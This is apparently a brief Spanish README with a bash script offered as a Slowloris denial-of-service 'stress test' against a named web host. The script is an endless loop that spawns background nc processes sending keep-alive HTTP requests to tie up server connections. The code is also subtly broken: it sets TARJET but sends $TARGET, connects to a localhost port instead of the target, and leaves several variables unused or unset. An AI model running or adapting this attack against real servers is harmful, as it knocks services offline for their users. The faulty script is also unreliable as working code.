# slowloris 

Ataque Slowloris de denegacion de servicio con peticiones web 

#!/bin/bash
# Slowloris test de stress
# Solo para fines de investigacion.
# chmod 777 slowloris.sh
# ./slowloris.sh

LHOST=127.0.0.1
LPORT=9991
while true; do
TARJET=web.hackingyseguridad.com
CONNS=99999
INTERVAL=99
echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
